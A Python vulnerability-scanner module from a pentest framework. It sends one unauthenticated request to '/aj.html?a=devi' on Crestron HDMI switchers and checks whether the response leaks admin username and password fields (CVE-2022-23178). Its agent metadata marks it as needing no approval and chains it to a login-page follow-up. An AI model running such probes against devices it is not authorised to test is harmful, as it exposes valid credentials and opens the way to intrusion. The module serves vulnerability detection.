#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An issue was discovered on Crestron HD-MD4X2-4K-E 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Crestron Device - Credentials Disclosure Detection',
        'description': 'An issue was discovered on Crestron HD-MD4X2-4K-E 1.0.0.2159 devices. When the administrative web interface of the HDMI switcher is accessed unauthenticated, user credentials are disclosed that are valid to authenticate to the web interface. Specifically, aj.html sends a JSON document with uname and upassword fields.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'crestron', 'disclosure', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.redteam-pentesting.de/en/advisories/rt-sa-2021-009/-credential-disclosure-in-web-interface-of-crestron-device',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-23178',
            'https://de.crestron.com/Products/Video/HDMI-Solutions/HDMI-Switchers/HD-MD4X2-4K-E',
            'https://www.redteam-pentesting.de/advisories/rt-sa-2021-009',
            'https://github.com/Threekiii/Awesome-POC',
        ],
        'cve': 'CVE-2022-23178',
    }

    def run(self):
        r = self.http_request(method="GET", path='/aj.html?a=devi', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"uname":', '"upassword":',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="Crestron Device - Credentials Disclosure detected",
                path='/aj.html?a=devi',
            )
            return True
        return False

